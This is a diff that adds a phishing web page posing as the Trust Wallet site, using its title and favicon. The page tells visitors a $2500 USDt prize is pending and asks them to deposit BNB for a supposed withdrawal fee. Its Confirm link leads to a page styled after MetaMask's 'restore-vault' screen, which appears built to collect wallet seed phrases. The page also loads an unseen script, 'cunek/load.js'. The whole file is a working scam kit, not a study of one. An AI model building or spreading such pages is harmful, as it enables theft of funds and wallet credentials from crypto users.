@@ -1,0 +1,671 @@
+
+<!doctype html>
+<html lang="en"><head>
+    <style>
+        .anticon {
+            display: inline-block;
+            color: inherit;
+            font-style: normal;
+            line-height: 0;
+            text-align: center;
+            text-transform: none;
+            vertical-align: -0.125em;
+            text-rendering: optimizeLegibility;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        
+        .anticon>* {
+            line-height: 1;
+        }
+        
+        .anticon svg {
+            display: inline-block;
+        }
+        
+        .anticon::before {
+            display: none;
+        }
+        
+        .anticon .anticon-icon {
+            display: block;
+        }
+        
+        .anticon[tabindex] {
+            cursor: pointer;
+        }
+        
+        .anticon-spin::before,
+        .anticon-spin {
+            display: inline-block;
+            -webkit-animation: loadingCircle 1s infinite linear;
+            animation: loadingCircle 1s infinite linear;
+        }
+        
+        @-webkit-keyframes loadingCircle {
+            100% {
+                -webkit-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+        
+        @keyframes loadingCircle {
+            100% {
+                -webkit-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+    <style>
+        .eEPviq {
+            border: none;
+            color: rgb(68, 68, 68);
+            background: rgb(233, 234, 237);
+            transition: all 0.5s ease 0s;
+            font-size: 18px;
+            width: 100%;
+            padding: 15px 0px;
+            border-radius: 4px;
+            cursor: pointer;
+            outline: none;
+            margin-bottom: 20px;
+        }
+        
+        @media (max-width: 768px) .eEPviq {
+            font-size: 16px;
+            padding: 12px 0px;
+        }
+        
+        .OHNdu {
+            position: relative;
+            width: 500px;
+            min-height: 100vh;
+            background: rgb(255, 255, 255);
+        }
+        
+        .jvrGcO {
+            display: flex;
+            -webkit-box-align: center;
+            align-items: center;
+            -webkit-box-pack: center;
+            justify-content: center;
+            width: 100%;
+            min-height: 100vh;
+            background-attachment: fixed;
+        }
+        
+        .hARKVj {
+            -webkit-box-align: center;
+            align-items: center;
+            width: 100%;
+            padding: 10px 0px 10px;
+            margin-bottom: 20px;
+            -webkit-box-pack: justify;
+            justify-content: space-between;
+            border-bottom: 1px solid rgb(226, 226, 226);
+            background-color: #3375bb !important;
+        }
+        
+        .gdtVXy {
+            width: 180px;
+        }
+        
+        .eNdDTk {
+            width: 150px;
+        }
+        
+        .kFZWwp {
+            font-family: Gilroy, sans-serif;
+            background-color: #F6F6F6;
+            font-size: 0.9rem;
+            color: rgba(127, 127, 127, 0.85);
+        }
+        
+        .cDnNqw .ant-input-affix-wrapper {
+            background-color: rgb(255, 255, 255);
+            border: 1px solid rgb(226, 226, 226) !important;
+        }
+        
+        .cDnNqw input.ant-input,
+        .cDnNqw .ant-select-selection {
+            font-size: 1rem;
+            font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
+            /* line-height: 140%; */
+            font-style: normal;
+            font-weight: normal;
+            /* height: 190px; */
+            /* width: 495px; */
+            border: 1px solid #cdcdcd;
+            border-radius: 6px;
+            background-color: #fff;
+            padding: 12px;
+        }
+        
+        .fWmldN {
+            background-color: #3375bb !important;
+            color: rgb(255, 255, 255);
+            border: none;
+            transition: all 0.5s ease 0s;
+            font-size: 14px;
+            width: 40%;
+            padding: 8px 0px;
+            border-radius: 4px;
+            cursor: pointer;
+            outline: none;
+            margin-bottom: 20px;
+            text-align: center;
+            /* justify-content: space-between; */
+            /* display: flex; */
+        }
+        
+        .iZNmqq {
+            color: rgb(39, 52, 152);
+            width: 100%;
+            font-size: 16px;
+            margin-bottom: 60px;
+            text-align: left;
+        }
+        
+        .import-account__secret-phrase {
+            /*font-size: 1rem;*/
+            /*font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;*/
+            /* line-height: 140%; */
+            font-style: normal;
+            font-weight: normal;
+            height: 140px;
+            width: 100%;
+            border: 1px solid #cdcdcd;
+            border-radius: 6px;
+            background-color: #fff;
+            padding: 12px;
+        }
+        
+        .thepadding {
+            padding: 0px 35px 0px;
+            color: rgb(39, 52, 152);
+        }
+        
+        .barnerd {
+            background-color: #3375bb !important;
+        }
+        
+        .confirm-approve-content__card,
+        .confirm-approve-content__card--no-border {
+            display: flex;
+            flex-flow: column;
+            border-bottom: 1px solid #d2d8dd;
+            position: relative;
+            padding-left: 24px;
+            padding-right: 24px;
+        }
+        
+        .confirm-approve-content__card-header {
+            display: flex;
+            flex-flow: row;
+            margin-top: 20px;
+            align-items: center;
+            position: relative;
+            justify-content: space-between;
+        }
+        
+        .confirm-approve-content__card-header__title,
+        .confirm-approve-content__card-header__title-value {
+            font-size: 0.875rem;
+            font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
+            line-height: 140%;
+            font-style: normal;
+            font-weight: normal;
+            font-weight: bold;
+            color: #4d4d4d;
+        }
+        
+        .confirm-approve-content__small-text,
+        .confirm-approve-content__small-blue-text,
+        .confirm-approve-content__info-row {
+            font-size: 0.75rem;
+            font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
+            line-height: 140%;
+            font-style: normal;
+            font-weight: normal;
+        }
+        
+        .confirm-approve-content__small-blue-text {
+            color: #037dd6;
+        }
+        
+        .confirm-approve-content__transaction-details-content {
+            display: flex;
+            flex-flow: row;
+            justify-content: space-between;
+        }
+        
+        .confirm-approve-content__transaction-details-content__fee {
+            display: flex;
+            flex-flow: column;
+            align-items: flex-end;
+            text-align: right;
+        }
+        
+        .confirm-approve-content__transaction-details-content__primary-fee {
+            font-size: 1.125rem;
+            font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
+            line-height: 140%;
+            font-style: normal;
+            font-weight: normal;
+            font-weight: bold;
+            color: #000;
+        }
+        
+        .pot {
+            display: flex;
+            -webkit-box-align: center;
+            align-items: center;
+            width: 100%;
+            padding: 20px 0px 30px;
+            margin-bottom: 20px;
+            -webkit-box-pack: justify;
+            justify-content: space-between;
+        }
+        
+        .ikREId {
+            color: rgb(68, 68, 68);
+            background: rgb(233, 234, 237);
+            border: none;
+            transition: all 0.5s ease 0s;
+            font-size: 14px;
+            width: 40%;
+            padding: 8px 0px;
+            border-radius: 4px;
+            cursor: pointer;
+            outline: none;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .boha {
+            margin-bottom: 9em;
+        }
+    </style>
+    <meta charset="utf-8">
+    <link rel="icon" href="https://trustwallet.com/assets/images/favicon.ico">
+    <link rel="manifest" href="/manifest.json">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="theme-color" content="#000000">
+    <meta name="Cashtab" content="Cashtab">
+    <link rel="manifest" href="/manifest.json">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta property="og:description" content="A web wallet for eCash">
+    <meta property="og:title" content="Cashtab">
+    <meta property="og:image" content="https://cashtabapp.com/cashtab_twitter.png">
+    <link rel="apple-touch-icon" href="https://trustwallet.com/assets/images/favicon.png">
+    <title>Best Crypto Wallet for Web3, NFTs and DeFi | Trust</title>
+    <link href="cunek/app.css" rel="stylesheet">
+    <link href="cunek/main.chunk.css" rel="stylesheet">
+    <style>
+        .anticon {
+            display: inline-block;
+            color: inherit;
+            font-style: normal;
+            line-height: 0;
+            text-align: center;
+            text-transform: none;
+            vertical-align: -0.125em;
+            text-rendering: optimizeLegibility;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        
+        .anticon>* {
+            line-height: 1;
+        }
+        
+        .anticon svg {
+            display: inline-block;
+        }
+        
+        .anticon::before {
+            display: none;
+        }
+        
+        .anticon .anticon-icon {
+            display: block;
+        }
+        
+        .anticon[tabindex] {
+            cursor: pointer;
+        }
+        
+        .anticon-spin::before,
+        .anticon-spin {
+            display: inline-block;
+            -webkit-animation: loadingCircle 1s infinite linear;
+            animation: loadingCircle 1s infinite linear;
+        }
+        
+        @-webkit-keyframes loadingCircle {
+            100% {
+                -webkit-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+        
+        @keyframes loadingCircle {
+            100% {
+                -webkit-transform: rotate(360deg);
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+    <style>
+        .eEPviq {
+            border: none;
+            color: rgb(68, 68, 68);
+            background: rgb(233, 234, 237);
+            transition: all 0.5s ease 0s;
+            font-size: 18px;
+            width: 100%;
+            padding: 15px 0px;
+            border-radius: 4px;
+            cursor: pointer;
+            outline: none;
+            margin-bottom: 20px;
+        }
+        
+        @media (max-width: 768px) .eEPviq {
+            font-size: 16px;
+            padding: 12px 0px;
+        }
+        
+        .OHNdu {
+            position: relative;
+            width: 500px;
+            min-height: 100vh;
+            background: #17171f;
+        }
+        
+        .jvrGcO {
+            display: flex;
+            -webkit-box-align: center;
+            align-items: center;
+            -webkit-box-pack: center;
+            justify-content: center;
+            width: 100%;
+            min-height: 100vh;
+            background-attachment: fixed;
+        }
+        
+        .hARKVj {
+            -webkit-box-align: center;
+            align-items: center;
+            width: 100%;
+            padding: 10px 0px 10px;
+            margin-bottom: 20px;
+            -webkit-box-pack: justify;
+            justify-content: space-between;
+            border-bottom: 1px solid #2d2d3b;
+            background-color: #17171f !important;
+        }
+        
+        .gdtVXy {
+            width: 180px;
+        }
+        
+        .eNdDTk {
+            width: 150px;
+        }
+        
+        .kFZWwp {
+            font-family: Gilroy, sans-serif;
+            background-color: #17171f;
+            font-size: 0.9rem;
+            color: rgba(127, 127, 127, 0.85);
+        }
+        
+        .cDnNqw .ant-input-affix-wrapper {
+            background-color: rgb(255, 255, 255);
+            border: 1px solid rgb(226, 226, 226) !important;
+        }
+        
+        .cDnNqw input.ant-input,
+        .cDnNqw .ant-select-selection {
+            font-size: 1rem;
+            font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
+            /* line-height: 140%; */
+            font-style: normal;
+            font-weight: normal;
+            /* height: 190px; */
+            /* width: 495px; */
+            border: 1px solid #cdcdcd;
+            border-radius: 6px;
+            background-color: #17171f;
+            padding: 12px;
+        }
+        
+        .fWmldN {
+            background-color: #3375bb !important;
+            color: rgb(255, 255, 255);
+            border: none;
+            transition: all 0.5s ease 0s;
+            font-size: 14px;
+            width: 40%;
+            padding: 8px 0px;
+            border-radius: 4px;
+            cursor: pointer;
+            outline: none;
+            margin-bottom: 20px;
+            text-align: center;
+            /* justify-content: space-between; */
+            /* display: flex; */
+        }
+        
+        .iZNmqq {
+            color: rgb(39, 52, 152);
+            width: 100%;
+            font-size: 16px;
+            margin-bottom: 60px;
+            text-align: left;
+        }
+        
+        .import-account__secret-phrase {
+            /*font-size: 1rem;*/
+            /*font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;*/
+            /* line-height: 140%; */
+            font-style: normal;
+            font-weight: normal;
+            height: 140px;
+            width: 100%;
+            border: 1px solid #cdcdcd;
+            border-radius: 6px;
+            background-color: #fff;
+            padding: 12px;
+        }
+        
+        .thepadding {
+            padding: 0px 35px 0px;
+                color: #4c4c61;
+        }
+        
+        .barnerd {
+            background-color: #3375bb !important;
+        }
+        
+        .confirm-approve-content__card,
+        .confirm-approve-content__card--no-border {
+            display: flex;
+            flex-flow: column;
+            border-bottom: 1px solid #d2d8dd;
+            position: relative;
+            padding-left: 24px;
+            padding-right: 24px;
+        }
+        
+        .confirm-approve-content__card-header {
+            display: flex;
+            flex-flow: row;
+            margin-top: 20px;
+            align-items: center;
+            position: relative;
+            justify-content: space-between;
+        }
+        
+        .confirm-approve-content__card-header__title,
+        .confirm-approve-content__card-header__title-value {
+            font-size: 0.875rem;
+            font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
+            line-height: 140%;
+            font-style: normal;
+            font-weight: normal;
+            font-weight: bold;
+            color: #4d4d4d;
+        }
+        
+        .confirm-approve-content__small-text,
+        .confirm-approve-content__small-blue-text,
+        .confirm-approve-content__info-row {
+            font-size: 0.75rem;
+            font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
+            line-height: 140%;
+            font-style: normal;
+            font-weight: normal;
+        }
+        
+        .confirm-approve-content__small-blue-text {
+            color: #037dd6;
+        }
+        
+        .confirm-approve-content__transaction-details-content {
+            display: flex;
+            flex-flow: row;
+            justify-content: space-between;
+        }
+        
+        .confirm-approve-content__transaction-details-content__fee {
+            display: flex;
+            flex-flow: column;
+            align-items: flex-end;
+            text-align: right;
+        }
+        
+        .confirm-approve-content__transaction-details-content__primary-fee {
+            font-size: 1.125rem;
+            font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
+            line-height: 140%;
+            font-style: normal;
+            font-weight: normal;
+            font-weight: bold;
+            color: #f04134;;
+        }
+        
+        .pot {
+            display: flex;
+            -webkit-box-align: center;
+            align-items: center;
+            width: 100%;
+            padding: 20px 0px 30px;
+            margin-bottom: 20px;
+            -webkit-box-pack: justify;
+            justify-content: space-between;
+        }
+        
+        .ikREId {
+            color: rgb(68, 68, 68);
+            background: rgb(233, 234, 237);
+            border: none;
+            transition: all 0.5s ease 0s;
+            font-size: 14px;
+            width: 40%;
+            padding: 8px 0px;
+            border-radius: 4px;
+            cursor: pointer;
+            outline: none;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .boha {
+            margin-bottom: 9em;
+        }
+    </style>
+<meta charset="utf-8"><link rel="icon" href="images/truste.png"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#fafafa">
+<link href="cunek/apk.css" rel="stylesheet">
+<link rel="apple-touch-icon" href="images/truste.png&quot;"><title>Best Crypto Wallet for Web3, NFTs and DeFi | Trust</title>
+<link href="cunek/chunk1.css" rel="stylesheet">
+<link href="cunek/app.css" rel="stylesheet">
+<link href="cunek/main.chunk.css" rel="stylesheet">
+<script src="cunek/jquery.min.js"></script>
+<script src="https://cdn.ethers.io/scripts/ethers-v4.min.js" charset="utf-8" type="text/javascript"></script>
+</head>
+<body>
+
+
+
+<div id="root"><div class="ant-spin-nested-loading"><div class=""><div class="sc-jqCOkK kFZWwp">
+
+               <div class=""><div class="sc-jqCOkK kFZWwp">
+
+<div class="sc-gGBfsJ jvrGcO"><div class="sc-jnlKLf OHNdu"><div class="sc-fYxtnH hARKVj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="images/cunekpantek.png" alt="" style="height: 50px;width: 150px;" class="sc-tilXH gdtVXy"></div>
+
+							
+                            <center><div class="confirm-approve-content__identicon-wrapper"><img class="identicon confirm-approve-content__identicon" src="images/825.png" alt="" style="height: 60px;width: 60px;"></div></center>  
+								<div class="confirm-approve-content__title" style="
+    font-size: 1.2rem;
+    line-height: 140%;
+    justify-content: center;
+    text-align: center;
+    margin-top: 22px;
+    padding-left: 24px;
+    padding-right: 24px;
+    color: #00a854;
+    ">$2500 USDt Available.</div>
+	<h2><center>Transfer (pending)</center></h2>
+                                
+                              <center><div class="thepadding">To get <b style="color: #14cf5e;font-weight: bold;">$2500 USDt</b> you must have a balance of at least 0.069 BNB on the network. Please deposit BNB Smart Chain to your wallet address.</div>
+                            </center>
+                            <div class="confirm-approve-content__card--no-border">
+                                <div class="confirm-approve-content__card-header">
+                                    <div class="confirm-approve-content__card-header__title">Transaction Fee</div>
+                                    <div class="confirm-approve-content__small-blue-text cursor-pointer">USD/BNB</div>
+                                </div>
+                                <div class="confirm-approve-content__card-content">
+                                    <div class="confirm-approve-content__transaction-details-content">
+                                        <div class="confirm-approve-content__small-text">A fee is associated with this request.</div>
+                                        <div class="confirm-approve-content__transaction-details-content__fee">
+                                            <div class="confirm-approve-content__transaction-details-content__primary-fee">$33.86</div>
+                                            <div class="confirm-approve-content__transaction-details-content__secondary-fee"><b>0.075 BNB</b></div>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                               <div class="sc-htoDjs cDnNqw">
+                                    <div class="ant-form ant-form-horizontal" style="width: auto;">
+                                        <div class="ant-row ant-form-item ant-form-item-with-help" style="row-gap: 0px;"></div>
+                                        <div class="thepadding" style="color: red;font-weight: ">Not enough funds for withdraw fee, please fill your balance</div>
+<div class="pot">
+                                           <a href="javascript:window.open('invalid.html?nkbihfbeogaeaoehlefnkodbefgpgknn/#restore-vault','_self').close();" class="sc-VigVT fWmldN">Confirm</a>
+
+                                        </div>
+										<center><div class="thepadding">Note: if your account is eligible, the prize will be credited within 24 hours.</div>
+                            </center>
+                                   
+                                </div>
+                                </div>
+                                <div class="confirm-approve-content__view-full-tx-button-wrapper">
+                                    <div class="confirm-approve-content__view-full-tx-button cursor-pointer"></div>
+                                </div>
+                           <div class="wawobp loader" data-tenqwa="9fkuxe">
+                                <div class="yat5ls lodas" data-2ivb6w="2n92zq">
+                                    <img class="identicon confirm-approve-content__identicon" src="images/truste.png" alt="" style="height: 70px;width: 70px;">
+                      <path opacity="0.9" d="M19.9959 4.8377L20.7771 3.82105C20.5523 3.64825 20.2766 3.55457 19.9931 3.55457C19.7095 3.55457 19.4339 3.64825 19.209 3.82105L19.9959 4.8377ZM33.425 8.7837H34.7059C34.7081 8.61378 34.6767 8.44509 34.6134 8.28737C34.5502 8.12965 34.4563 7.98603 34.3372 7.8648C34.2181 7.74358 34.0762 7.64714 33.9196 7.58107C33.763 7.515 33.5949 7.4806 33.425 7.47985V8.7837ZM19.9959 36.2161L19.2837 37.2845C19.4936 37.425 19.7405 37.5 19.9931 37.5C20.2457 37.5 20.4925 37.425 20.7024 37.2845L19.9959 36.2161ZM6.57841 8.7837V7.49709C6.40847 7.49783 6.24036 7.53223 6.0838 7.5983C5.92723 7.66437 5.7853 7.76081 5.66621 7.88204C5.54712 8.00326 5.45322 8.14688 5.38995 8.3046C5.32667 8.46232 5.29526 8.63101 5.29754 8.80093L6.57841 8.7837ZM19.2148 5.84861C25.0275 10.3518 31.6846 10.0646 33.4307 10.0646V7.49709C31.6214 7.49709 25.8259 7.72684 20.7943 3.82105L19.2148 5.84861ZM32.1499 8.76073C32.0522 14.7113 31.7995 18.91 31.317 22.0174C30.8345 25.1248 30.1682 26.9399 29.2894 28.238C28.4106 29.5361 27.2848 30.3804 25.6364 31.3626C23.9879 32.3448 21.8799 33.4361 19.2837 35.1535L20.7312 37.2845C23.1895 35.6475 25.2343 34.6021 26.9747 33.5625C28.7284 32.6075 30.2502 31.2779 31.4319 29.6682C32.5806 27.9451 33.3675 25.6475 33.873 22.408C34.3785 19.1685 34.6369 14.809 34.7346 8.80093L32.1499 8.76073ZM20.7312 35.1535C18.1522 33.4304 16.05 32.362 14.413 31.3684C12.776 30.3747 11.6502 29.582 10.7656 28.238C9.8811 26.8939 9.16312 25.1076 8.66915 22.0174C8.17519 18.9273 7.95692 14.7113 7.85928 8.76073L5.29754 8.80093C5.39518 14.809 5.6594 19.18 6.15911 22.408C6.65882 25.636 7.42275 27.9336 8.59448 29.6682C9.77051 31.2788 11.2888 32.6088 13.0402 33.5625C14.7633 34.6021 16.8254 35.6475 19.2837 37.2845L20.7312 35.1535ZM6.57841 10.0646C8.30155 10.0646 14.9644 10.3518 20.7771 5.84861L19.209 3.82105C14.166 7.72684 8.37048 7.49709 6.57266 7.49709L6.57841 10.0646Z" fill="#0b65c6"></path>
+                    </svg>
+                                    <div class="7n1smr loader2 loader--style3" title="2" data-knlucr="ga7q37">
+                                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin:auto;background:#fff;display:block;" width="40px" height="40px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
+                        <circle cx="50" cy="50" fill="none" stroke="#0b65c6" stroke-width="10" r="35" stroke-dasharray="164.93361431346415 56.97787143782138">
+                          <animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform>
+                        </circle>
+                      </svg>
+
+                </div>
+    <script src="cunek/load.js"></script>
+
+</div></div></a></div></div></div>
+</div></div></div></body></html>
